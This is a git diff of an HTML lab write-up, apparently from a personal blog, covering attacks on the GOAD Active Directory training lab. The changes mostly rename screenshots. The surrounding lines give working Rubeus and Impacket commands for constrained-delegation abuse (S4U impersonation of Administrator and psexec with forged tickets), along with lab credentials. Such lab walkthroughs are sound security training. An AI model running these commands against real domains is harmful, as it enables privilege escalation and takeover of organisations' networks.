@@ -200,18 +200,12 @@
 <td>NORTH\sql_svc</td>
 <td>YouWillNotKerboroast1ngMeeeeee</td>
 </tr>
-<tr>
-<td>TODO:</td>
-<td></td>
-</tr>
 </tbody>
 </table>
-<ul>
-<li>Constrained delegation</li>
-<li>mssql</li>
-<li>essos.local</li>
-<li>AD CS</li>
-</ul>
+<p>TODO:
+- mssql
+- essos.local
+- AD CS</p>
 <h2 id="initial-enumeration">Initial Enumeration</h2>
 <div class="highlight"><pre><span></span><code><span class="err">#</span><span class="w"> </span><span class="nx">Nmap</span><span class="w"> </span><span class="m m-Double">7.95</span><span class="w"> </span><span class="nx">scan</span><span class="w"> </span><span class="nx">initiated</span><span class="w"> </span><span class="nx">Tue</span><span class="w"> </span><span class="nx">Jan</span><span class="w"> </span><span class="mi">28</span><span class="w"> </span><span class="mi">09</span><span class="p">:</span><span class="mi">36</span><span class="p">:</span><span class="mi">12</span><span class="w"> </span><span class="mi">2025</span><span class="w"> </span><span class="k">as</span><span class="p">:</span><span class="w"> </span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">lib</span><span class="o">/</span><span class="nx">nmap</span><span class="o">/</span><span class="nx">nmap</span><span class="w"> </span><span class="o">-</span><span class="nx">sC</span><span class="w"> </span><span class="o">-</span><span class="nx">sV</span><span class="w"> </span><span class="o">-</span><span class="nx">iL</span><span class="w"> </span><span class="nx">targets</span><span class="p">.</span><span class="nx">txt</span><span class="w"> </span><span class="o">-</span><span class="nx">oN</span><span class="w"> </span><span class="nx">common</span><span class="o">-</span><span class="nx">port</span><span class="o">-</span><span class="nx">scanning</span><span class="p">.</span><span class="nx">nmap</span>
 <span class="w">    </span><span class="nx">Nmap</span><span class="w"> </span><span class="nx">scan</span><span class="w"> </span><span class="nx">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m m-Double">10.1.0.10</span>
@@ -769,16 +763,16 @@ impacket-ticketConverter<span class="w"> </span>kingslanding.kirbi<span class="w
 <p>Enumerate users with constrained delegation enabled:</p>
 <div class="highlight"><pre><span></span><code><span class="nb">Get-ADObject</span> <span class="n">-Filter</span> <span class="p">{</span><span class="n">msDS-AllowedToDelegateTo</span> <span class="o">-ne</span> <span class="s2">"$null"</span><span class="p">}</span> <span class="n">-Properties</span> <span class="n">msDS-AllowedToDelegateTo</span> <span class="p">|</span> <span class="nb">select </span><span class="n">DistinguishedName</span><span class="p">,</span> <span class="n">msDS-AllowedToDelegateTo</span>
 </code></pre></div>
-<p><img alt="Pasted image 20250215120621.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250215120621.png"/></p>
+<p><img alt="north-constrained-delegation-enum-alt1.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-constrained-delegation-enum-alt1.png"/></p>
 <p>Having <code>jon.snow</code> credentials/hash it's possible to abuse constrained delegation to impersonate any user (Administrator) for the SPN <code>CIFS/winterfell.north.sevenkingdoms.local</code></p>
 <p>Request TGT for <code>jon.snow</code>:</p>
 <div class="highlight"><pre><span></span><code>.<span class="se">\R</span>ubeus.exe<span class="w"> </span>asktgt<span class="w"> </span>/user:jon.snow<span class="w"> </span>/password:iknownothing<span class="w"> </span>/domain:north.sevenkingdoms.local<span class="w"> </span>/outfile:jon.snow.tgt.kirbi
 </code></pre></div>
-<p><img alt="Pasted image 20250215120928.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250215120928.png"/></p>
+<p><img alt="north-constrained-delegation-tgt-alt1.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-constrained-delegation-tgt-alt1.png"/></p>
 <p>Execute S4U2Self followed by a S4U2Proxy to impersonate <code>Administrator</code>:</p>
 <div class="highlight"><pre><span></span><code>.<span class="se">\R</span>ubeus.exe<span class="w"> </span>s4u<span class="w"> </span>/ticket:jon.snow.tgt.kirbi<span class="w"> </span>/impersonateuser:administrator<span class="w"> </span>/domain:north.sevenkingdoms.local<span class="w"> </span>/msdsspn:CIFS/winterfell.north.sevenkingdoms.local<span class="w"> </span>/dc:north.sevenkingdoms.local<span class="w"> </span>/ptt
 </code></pre></div>
-<p><img alt="Pasted image 20250215121332.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250215121332.png"/></p>
+<p><img alt="north-constrained-delegation-s4u-alt1.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-constrained-delegation-s4u-alt1.png"/></p>
 <p>On the attacker machine, convert Base64 ticket to kirbi format to ccache format with Impacket's <code>ticketConverter</code></p>
 <div class="highlight"><pre><span></span><code>base64<span class="w"> </span>-w<span class="w"> </span><span class="m">0</span><span class="w"> </span>-d<span class="w"> </span>jon.snow.s4u.administrator.b64<span class="w"> </span>&gt;<span class="w"> </span>jon.snow.s4u.administrator.kirbi
 impacket-ticketConverter<span class="w"> </span>jon.snow.s4u.administrator.kirbi<span class="w"> </span>jon.snow.s4u.administrator.ccache
@@ -787,22 +781,22 @@ impacket-ticketConverter<span class="w"> </span>jon.snow.s4u.administrator.kirbi
 <div class="highlight"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>jon.snow.s4uproxy.administrator.ccache
 impacket-psexec<span class="w"> </span>-no-pass<span class="w"> </span>-k<span class="w"> </span>winterfell.north.sevenkingdoms.local
 </code></pre></div>
-<p><img alt="Pasted image 20250215121618.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250215121618.png"/></p>
+<p><img alt="north-constrained-delegation-ptt-alt1.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-constrained-delegation-ptt-alt1.png"/></p>
 <h3 id="alternative-2">Alternative 2</h3>
 <p>Enumerate users with constrained delegation enabled:</p>
 <div class="highlight"><pre><span></span><code>impacket-findDelegation<span class="w"> </span>north.sevenkingdoms.local/robb.stark:sexywolfy<span class="w"> </span>-target-domain<span class="w"> </span>north.s
 </code></pre></div>
-<p><img alt="Pasted image 20250215121817.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250215121817.png"/></p>
+<p><img alt="north-constrained-delegation-enum-alt2.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-constrained-delegation-enum-alt2.png"/></p>
 <p>Having <code>jon.snow</code> credentials/hash it's possible to abuse constrained delegation to impersonate any user (Administrator) for the SPN <code>CIFS/winterfell.north.sevenkingdoms.local</code></p>
 <p>Request TGT for <code>jon.snow</code> and execute S4U2Self followed by a S4U2Proxy to impersonate <code>Administrator</code>:</p>
 <div class="highlight"><pre><span></span><code>impacket-getST<span class="w"> </span>-spn<span class="w"> </span>CIFS/winterfell.north.sevenkingdoms.local<span class="w"> </span>-impersonate<span class="w"> </span>Administrator<span class="w"> </span>north.sevenkingdoms.local/jon.snow:iknownothing
 </code></pre></div>
-<p><img alt="Pasted image 20250215122344.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250215122344.png"/></p>
+<p><img alt="north-constrained-delegation-tgt+s4u-alt2.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-constrained-delegation-tgt+s4u-alt2.png"/></p>
 <p>Run psexec with resulting ticket:</p>
 <div class="highlight"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator@CIFS_winterfell.north.sevenkingdoms.local@NORTH.SEVENKINGDOMS.LOCAL.ccache
 impacket-psexec<span class="w"> </span>-no-pass<span class="w"> </span>-k<span class="w"> </span>winterfell.north.sevenkingdoms.local
 </code></pre></div>
-<p><img alt="Pasted image 20250215121618.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250215121618.png"/></p>
+<p><img alt="north-constrained-delegation-ptt-alt1.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-constrained-delegation-ptt-alt1.png"/></p>
 <h2 id="golden-ticket_1">Golden Ticket</h2>
 <h3 id="child-domain-to-parent">Child domain to parent</h3>
 <p>Dump NTLM hashes and Kerberos keys:</p>
